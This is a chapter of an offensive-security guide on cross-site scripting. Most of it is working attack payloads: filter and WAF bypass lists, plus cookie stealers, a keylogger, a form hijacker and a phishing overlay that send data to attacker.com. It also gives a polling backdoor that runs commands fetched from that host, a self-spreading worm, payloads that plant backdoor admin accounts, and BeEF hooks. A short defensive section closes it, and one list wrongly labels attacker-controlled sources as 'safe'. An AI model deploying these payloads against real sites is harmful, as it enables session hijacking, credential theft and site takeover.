# 1. CROSS-SITE SCRIPTING (XSS) - COMPLETE ATTACK CHAIN <a name="xss"></a>

## 1.1 THEORY & BACKGROUND

### What is XSS?

**Cross-Site Scripting (XSS)** is a client-side code injection attack where malicious scripts are injected into trusted websites. When a victim visits the compromised page, the malicious script executes in their browser.

**Why is XSS Dangerous?**
- Steal session cookies (session hijacking)
- Capture keystrokes (keylogging)
- Perform actions as the victim (CSRF)
- Redirect to malicious sites
- Deface websites
- Steal sensitive data
- Install malware
- Phishing attacks

### XSS Types

**1. Reflected XSS (Non-Persistent)**
- Malicious script reflected off web server
- Delivered via URL, form input, or search query
- Requires victim to click malicious link
- Most common type

**2. Stored XSS (Persistent)**
- Malicious script stored in database
- Executes when victim views the stored data
- Most dangerous type
- Examples: comment sections, profile fields, forum posts

**3. DOM-Based XSS**
- Client-side vulnerability
- JavaScript modifies DOM insecurely
- Never sent to server
- Executes entirely in browser

---

## 1.2 REFLECTED XSS - COMPLETE ATTACK CHAIN

### 1.2.1 Identification

**Basic Test Payloads:**

```html
<!-- Simple alert box -->
<script>alert('XSS')</script>

<!-- Alert with document domain -->
<script>alert(document.domain)</script>

<!-- Alert with cookie -->
<script>alert(document.cookie)</script>

<!-- Image tag with onerror -->
<img src=x onerror=alert('XSS')>

<!-- SVG with onload -->
<svg onload=alert('XSS')>

<!-- Body tag with onload -->
<body onload=alert('XSS')>

<!-- Input with autofocus -->
<input autofocus onfocus=alert('XSS')>

<!-- Iframe with src -->
<iframe src="javascript:alert('XSS')">

<!-- Details tag -->
<details open ontoggle=alert('XSS')>

<!-- Markdown in comments (if rendered) -->
[Click Me](javascript:alert('XSS'))
```

**Testing Workflow:**

```bash
# 1. Find input points
# - URL parameters: http://example.com/search?q=TEST
# - Form fields: search boxes, comment fields, login forms
# - HTTP headers: User-Agent, Referer, Cookie
# - File names in uploads
# - Any user-controllable data

# 2. Test with basic payload
http://example.com/search?q=<script>alert('XSS')</script>

# 3. Check response
# View page source and search for your input
curl "http://example.com/search?q=<script>alert('XSS')</script>" | grep -i script

# 4. If filtered, try variations
```

**Common Input Points:**

```
URL Parameters:
- http://site.com/page?search=<payload>
- http://site.com/page?id=<payload>
- http://site.com/page?name=<payload>

Form Fields:
- Search boxes
- Comment sections
- Profile information
- Contact forms
- Feedback forms

HTTP Headers:
- User-Agent
- Referer
- X-Forwarded-For
- Cookie values

File Operations:
- File names during upload
- Error messages
- Log file viewing
```

### 1.2.2 Bypass Techniques

**Filter Evasion:**

```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Tag variation -->
<script>alert('XSS')</script>
<SCRIPT>alert('XSS')</SCRIPT>
<script  >alert('XSS')</script>
<script/src=data:,alert('XSS')>

<!-- Encoding -->
<!-- HTML encoding -->
&#60;script&#62;alert('XSS')&#60;/script&#62;

<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Unicode encoding -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e

<!-- Hex encoding -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>

<!-- Base64 -->
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

<!-- NULL bytes -->
<script>alert('XSS')</script>%00
<scr%00ipt>alert('XSS')</scr%00ipt>

<!-- Comments -->
<!--[if gte IE 4]><script>alert('XSS')</script><![endif]-->
<script><!--
alert('XSS');
//--></script>

<!-- Newlines and tabs -->
<script>
alert('XSS')
</script>

<script>alert('XSS')</script>

<!-- Bypassing "script" filter -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<scr\x00ipt>alert('XSS')</scr\x00ipt>

<!-- Event handlers (if <script> blocked) -->
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>

<!-- JavaScript protocol -->
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')">

<!-- Data URI -->
<script src="data:text/javascript,alert('XSS')"></script>
<iframe src="data:text/html,<script>alert('XSS')</script>">

<!-- Bypassing parentheses filter -->
<script>onerror=alert;throw 'XSS'</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>

<!-- Bypassing quotes filter -->
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>

<!-- Template literals -->
<script>alert`XSS`</script>

<!-- Bypassing WAF -->
<svg><script>alert&#40;'XSS')</script>
<svg><script>&#97;lert('XSS')</script>
<svg><script>alert&lpar;'XSS'&rpar;</script>
```

**Context-Specific Payloads:**

```html
<!-- Inside HTML tag attribute -->
" onload="alert('XSS')
" onfocus="alert('XSS')" autofocus="
' onload='alert('XSS')

<!-- Inside JavaScript string -->
'; alert('XSS'); //
"; alert('XSS'); //
'-alert('XSS')-'
"-alert('XSS')-"

<!-- Inside JavaScript variable -->
</script><script>alert('XSS')</script>

<!-- Inside HTML comment -->
--><script>alert('XSS')</script><!--

<!-- Inside attribute value -->
value="TEST" onfocus="alert('XSS')" autofocus="

<!-- Inside href attribute -->
javascript:alert('XSS')
JaVaScRiPt:alert('XSS')
javascript&colon;alert('XSS')
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')

<!-- Inside src attribute -->
data:text/html,<script>alert('XSS')</script>
```

### 1.2.3 Exploitation

**Session Hijacking:**

```html
<!-- Basic cookie stealer -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- More stealthy (using image) -->
<script>
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- Using fetch API -->
<script>
fetch('http://attacker.com/steal.php?cookie='+document.cookie);
</script>

<!-- On attacker's server (steal.php): -->
<?php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
file_put_contents('cookies.txt', "$date - $ip - $cookie\n", FILE_APPEND);
?>

<!-- URL encoding for evasion -->
<script>
document.location='http://attacker.com/steal.php?c='+encodeURIComponent(document.cookie);
</script>
```

**Keylogging:**

```html
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += String.fromCharCode(e.which);
    new Image().src = 'http://attacker.com/log.php?k=' + encodeURIComponent(keys);
};
</script>
```

**Phishing:**

```html
<script>
// Create fake login form
document.body.innerHTML = `
<div style="text-align:center; margin-top:100px;">
    <h2>Session Expired - Please Login Again</h2>
    <form id="phish" action="http://attacker.com/phish.php" method="POST">
        Username: <input type="text" name="username"><br><br>
        Password: <input type="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</div>
`;
</script>
```

**Port Scanning:**

```html
<script>
function scan(ip, port) {
    var img = new Image();
    img.onerror = function() {
        // Port closed or filtered
    };
    img.onload = function() {
        // Port open
        new Image().src = 'http://attacker.com/log.php?open=' + ip + ':' + port;
    };
    img.src = 'http://' + ip + ':' + port;
}

// Scan common ports on internal network
for(var i=1; i<=254; i++) {
    scan('192.168.1.' + i, 80);
    scan('192.168.1.' + i, 443);
    scan('192.168.1.' + i, 22);
    scan('192.168.1.' + i, 3389);
}
</script>
```

**Form Hijacking:**

```html
<script>
// Intercept all form submissions
document.querySelectorAll('form').forEach(function(form) {
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        var formData = new FormData(form);
        var data = {};
        formData.forEach(function(value, key) {
            data[key] = value;
        });
        
        // Send to attacker
        fetch('http://attacker.com/steal.php', {
            method: 'POST',
            body: JSON.stringify(data)
        });
        
        // Submit original form
        form.submit();
    });
});
</script>
```

**BeEF (Browser Exploitation Framework) Hook:**

```html
<script src="http://attacker.com:3000/hook.js"></script>
```

**Advanced XSS Payload (Multi-Function):**

```html
<script>
(function() {
    // Steal cookies
    fetch('http://attacker.com/steal.php?c=' + document.cookie);
    
    // Log keystrokes
    var keys = '';
    document.onkeypress = function(e) {
        keys += String.fromCharCode(e.which);
        if(keys.length > 50) {
            fetch('http://attacker.com/keys.php?k=' + encodeURIComponent(keys));
            keys = '';
        }
    };
    
    // Capture form submissions
    document.querySelectorAll('form').forEach(function(form) {
        form.addEventListener('submit', function(e) {
            var formData = new FormData(form);
            var data = {};
            formData.forEach(function(value, key) {
                data[key] = value;
            });
            fetch('http://attacker.com/forms.php', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
    });
    
    // Screenshot (HTML2Canvas)
    var script = document.createElement('script');
    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
    script.onload = function() {
        html2canvas(document.body).then(canvas => {
            canvas.toBlob(blob => {
                var formData = new FormData();
                formData.append('screenshot', blob);
                fetch('http://attacker.com/screenshot.php', {
                    method: 'POST',
                    body: formData
                });
            });
        });
    };
    document.head.appendChild(script);
})();
</script>
```

---

## 1.3 STORED XSS - COMPLETE ATTACK CHAIN

### 1.3.1 Identification

**Common Vulnerable Points:**

```
Comment sections
Forum posts
User profiles (bio, about me, etc.)
Product reviews
Blog posts
Wiki pages
Contact/support tickets
Private messages
Image descriptions/captions
File names displayed on page
Log viewers
Admin panels (username fields shown to admin)
```

**Testing Procedure:**

```html
<!-- 1. Submit basic payload in input field -->
<script>alert('Stored XSS')</script>

<!-- 2. Navigate away and return -->
<!-- If alert fires on return, it's stored XSS -->

<!-- 3. Check if it persists after refresh -->

<!-- 4. Check if other users see it -->
<!-- Create second account and view the page -->

<!-- 5. Test various input fields -->
Username: <script>alert('XSS')</script>
Bio: <img src=x onerror=alert('XSS')>
Website: javascript:alert('XSS')
Comment: <svg onload=alert('XSS')>
```

### 1.3.2 Exploitation

**Self-Propagating XSS Worm (Social Network):**

```html
<script>
// XSS Worm - adds malicious post to victim's profile
(function() {
    var payload = document.getElementById('worm').innerHTML;
    
    // Get victim's session token
    var token = document.querySelector('input[name="csrf_token"]').value;
    
    // Create malicious post
    var formData = new FormData();
    formData.append('content', payload);
    formData.append('csrf_token', token);
    
    // Submit post
    fetch('/api/post', {
        method: 'POST',
        body: formData
    });
})();
</script>
<div id="worm" style="display:none;">
<!-- Worm payload here (includes itself) -->
<script src="http://attacker.com/worm.js"></script>
</div>
```

**Admin Account Compromise:**

```html
<!-- If stored in field visible to admin -->
<script>
// Create new admin account
fetch('/admin/users/create', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        username: 'backdoor',
        password: 'Passw0rd!',
        role: 'admin'
    })
}).then(response => {
    // Notify attacker
    fetch('http://attacker.com/success.php?admin=created');
});
</script>
```

**Persistent Backdoor:**

```html
<script>
// Poll attacker's server for commands
setInterval(function() {
    fetch('http://attacker.com/cmd.php?id=' + document.cookie)
        .then(response => response.text())
        .then(cmd => {
            eval(cmd); // Execute command from attacker
        });
}, 5000); // Every 5 seconds
</script>
```

### 1.3.3 Mass Compromise

**Stored XSS in Blog Comment:**

```html
<!-- Scenario: Popular blog with stored XSS in comments -->

<!-- Step 1: Post comment with payload -->
Great article! 
<script src="http://attacker.com/mass.js"></script>

<!-- mass.js content: -->
(function() {
    // Steal cookies from all visitors
    fetch('http://attacker.com/log.php?victim=' + window.location.href + 
          '&cookie=' + document.cookie +
          '&referrer=' + document.referrer);
    
    // If admin, perform privileged actions
    if(document.cookie.includes('admin=true')) {
        // Create backdoor account
        fetch('/admin/users', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: 'support',
                password: 'Passw0rd123!',
                role: 'administrator'
            })
        });
    }
})();

<!-- Result: Every visitor to that blog post is compromised -->
```

---

## 1.4 DOM-BASED XSS - COMPLETE ATTACK CHAIN

### 1.4.1 Theory

**What is DOM-Based XSS?**
- Vulnerability in client-side JavaScript code
- User input processed by JavaScript and inserted into DOM
- Never sent to server
- Harder to detect with traditional scanners

**Vulnerable Code Patterns:**

```javascript
// VULNERABLE: Using location.hash directly
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + name;
// URL: http://site.com/#<img src=x onerror=alert('XSS')>

// VULNERABLE: Using document.URL
var url = document.URL;
document.write(url);
// URL: http://site.com/?name=<script>alert('XSS')</script>

// VULNERABLE: Using document.referrer
var ref = document.referrer;
document.getElementById('ref').innerHTML = ref;

// VULNERABLE: eval() with user input
var search = location.search.substring(1);
eval(search);
// URL: http://site.com/?search=alert('XSS')

// VULNERABLE: innerHTML with user input
var msg = location.hash.substring(1);
document.getElementById('message').innerHTML = msg;

// VULNERABLE: document.write with user input
var param = new URLSearchParams(location.search).get('q');
document.write(param);
```

**Safe Sources (Attacker-Controllable):**
```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
location.href
location.search
location.hash
location.pathname
window.name
document.referrer
```

**Dangerous Sinks:**
```javascript
eval()
Function()
setTimeout()
setInterval()
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent (e.g., onclick, onerror)
```

### 1.4.2 Identification

**Manual Testing:**

```javascript
// 1. View page source and search for JavaScript
// 2. Look for user input handling
// 3. Test with payloads in:

// URL Fragment:
http://site.com/#<img src=x onerror=alert('DOM-XSS')>

// URL Parameters:
http://site.com/?name=<img src=x onerror=alert('DOM-XSS')>

// window.name (requires JavaScript):
<script>
window.name = '<img src=x onerror=alert("DOM-XSS")>';
window.location = 'http://site.com/vulnerable.html';
</script>

// postMessage:
<iframe src="http://site.com/vulnerable.html" id="target"></iframe>
<script>
window.frames[0].postMessage('<img src=x onerror=alert("DOM-XSS")>', '*');
</script>
```

**Automated Tools:**

```bash
# DOM XSS Scanner (Burp Extension)
# DOMinator
# DOM Invader (Burp)

# Manual inspection in browser:
# 1. Open Developer Tools
# 2. Sources tab
# 3. Search for dangerous functions: innerHTML, eval, document.write
# 4. Set breakpoints
# 5. Trace data flow from source to sink
```

### 1.4.3 Exploitation Examples

**Example 1: location.hash to innerHTML**

Vulnerable Code:
```javascript
var greeting = location.hash.substring(1);
document.getElementById('message').innerHTML = 'Hello ' + greeting;
```

Exploit:
```
http://site.com/page.html#<img src=x onerror=alert(document.cookie)>
```

**Example 2: URL Parameter to eval()**

Vulnerable Code:
```javascript
var code = new URLSearchParams(location.search).get('code');
eval(code);
```

Exploit:
```
http://site.com/page.html?code=alert(document.cookie)
```

**Example 3: JSON Injection**

Vulnerable Code:
```javascript
var user = location.hash.substring(1);
var json = '{"name":"' + user + '"}';
var obj = JSON.parse(json);
document.getElementById('name').innerHTML = obj.name;
```

Exploit:
```
http://site.com/page.html#","xss":"<img src=x onerror=alert('XSS')>
```

Results in:
```json
{"name":"","xss":"<img src=x onerror=alert('XSS')>"}
```

**Example 4: AngularJS Template Injection**

Vulnerable Code:
```html
<div ng-app>
    <input ng-model="name">
    <p>Hello {{name}}</p>
</div>
```

Exploit (AngularJS < 1.6):
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

---

## 1.5 XSS CHEAT SHEET

### 1.5.1 Event Handlers (Comprehensive)

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onerror=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
<body onresize=alert('XSS')>

<img src=x onerror=alert('XSS')>
<img src=x onload=alert('XSS')>

<svg onload=alert('XSS')>
<svg onresize=alert('XSS')>

<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus>
<input oninput=alert('XSS')>
<input onchange=alert('XSS')>

<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>

<video onerror=alert('XSS')><source>
<audio onerror=alert('XSS')><source>

<details open ontoggle=alert('XSS')>

<marquee onstart=alert('XSS')>
<marquee onfinish=alert('XSS')>
<marquee onbounce=alert('XSS')>

<form onsubmit=alert('XSS')>

<button onclick=alert('XSS')>Click</button>
<a href="#" onclick=alert('XSS')>Click</a>

<div onmouseover=alert('XSS')>Hover</div>
<div onmouseout=alert('XSS')>Hover</div>

<div contenteditable oninput=alert('XSS')>Type here</div>
```

### 1.5.2 Tag-Based Payloads

```html
<script>alert('XSS')</script>
<script src=http://attacker.com/xss.js></script>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

<iframe src=javascript:alert('XSS')>
<iframe src=data:text/html,<script>alert('XSS')</script>>

<embed src=javascript:alert('XSS')>
<object data=javascript:alert('XSS')>

<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<video><source onerror=alert('XSS')>
<audio><source onerror=alert('XSS')>

<a href=javascript:alert('XSS')>Click</a>
<form action=javascript:alert('XSS')><input type=submit>

<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>

<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>

<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>

<div contenteditable oninput=alert('XSS')>
<style>*{background:url(javascript:alert('XSS'))}</style>
```

### 1.5.3 Filter Bypass Techniques

```html
<!-- Uppercase/Mixed Case -->
<ScRiPt>alert('XSS')</ScRiPt>
<sCrIpT>alert('XSS')</sCrIpT>

<!-- Encoding -->
&#60;script&#62;alert('XSS')&#60;/script&#62;
\x3cscript\x3ealert('XSS')\x3c/script\x3e
\u003cscript\u003ealert('XSS')\u003c/script\u003e

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Nested tags -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

<!-- NULL bytes -->
<script>alert('XSS')</script>%00

<!-- Newlines -->
<script>
alert('XSS')
</script>

<!-- Comments -->
<scri<!--comment-->pt>alert('XSS')</scri<!--comment-->pt>

<!-- Alternative tags if <script> blocked -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>

<!-- Alternative to parentheses -->
<script>onerror=alert;throw 'XSS'</script>

<!-- Alternative to quotes -->
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>

<!-- Template literals -->
<script>alert`XSS`</script>

<!-- Bypassing WAF with spaces/tabs -->
<img/src=x/onerror=alert('XSS')>
<img	src=x	onerror=alert('XSS')>

<!-- Using different quotes -->
<img src='x' onerror="alert('XSS')">
<img src="x" onerror='alert("XSS")'>
<img src=x onerror=alert('XSS')>
```

---

## 1.6 XSS TOOLS

### 1.6.1 Manual Testing Tools

```bash
# Browser Developer Tools
# - Console for testing JavaScript
# - Network tab for observing requests
# - Source tab for viewing JavaScript code

# Burp Suite
# - Intercept and modify requests
# - Intruder for fuzzing
# - Scanner for automated detection

# OWASP ZAP
# - Active scanner
# - Fuzzer
# - Spider

# XSStrike (Python tool)
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py -u "http://site.com/search?q=test"

# dalfox (Fast XSS scanner)
dalfox url "http://site.com/search?q=test"
dalfox file urls.txt
dalfox pipe < urls.txt

# XSSer
xsser -u "http://site.com/search?q=XSS"
xsser -u "http://site.com/search?q=XSS" --auto

# Xenotix XSS Exploit Framework (GUI tool)
```

### 1.6.2 BeEF (Browser Exploitation Framework)

```bash
# Start BeEF
cd /usr/share/beef-xss
./beef

# Hook URL: http://your-ip:3000/hook.js

# Inject into XSS:
<script src="http://your-ip:3000/hook.js"></script>

# Features:
# - Browser fingerprinting
# - Network discovery
# - Social engineering
# - Persistent backdoor
# - Module execution (keylogging, phishing, etc.)
```

---

## 1.7 DEFENSE & MITIGATION

### 1.7.1 Input Validation

```php
// PHP example
// NEVER trust user input

// Encoding output (context-aware)
// For HTML context:
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// For JavaScript context:
echo json_encode($user_input);

// For URL context:
echo urlencode($user_input);

// For CSS context:
// Use CSS escaping function
```

```javascript
// JavaScript example
// Avoid dangerous functions
// DON'T:
element.innerHTML = user_input;
eval(user_input);
document.write(user_input);

// DO:
element.textContent = user_input; // Safe - no HTML parsing
element.innerText = user_input; // Safe
```

### 1.7.2 Content Security Policy (CSP)

```html
<!-- HTTP Header -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'

<!-- HTML Meta tag -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted.cdn.com">

<!-- Strict CSP (blocks inline scripts) -->
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'

<!-- CSP with nonce (allows specific inline scripts) -->
Content-Security-Policy: script-src 'nonce-random123'
<script nonce="random123">
// This script is allowed
</script>
```

### 1.7.3 Other Protections

```http
# HTTPOnly Cookie flag (prevents JavaScript access)
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

# X-XSS-Protection header (legacy, mostly deprecated)
X-XSS-Protection: 1; mode=block

# X-Content-Type-Options (prevents MIME sniffing)
X-Content-Type-Options: nosniff

# Sanitization libraries:
# - DOMPurify (JavaScript)
# - HTMLPurifier (PHP)
# - Bleach (Python)
# - OWASP Java HTML Sanitizer (Java)
```

---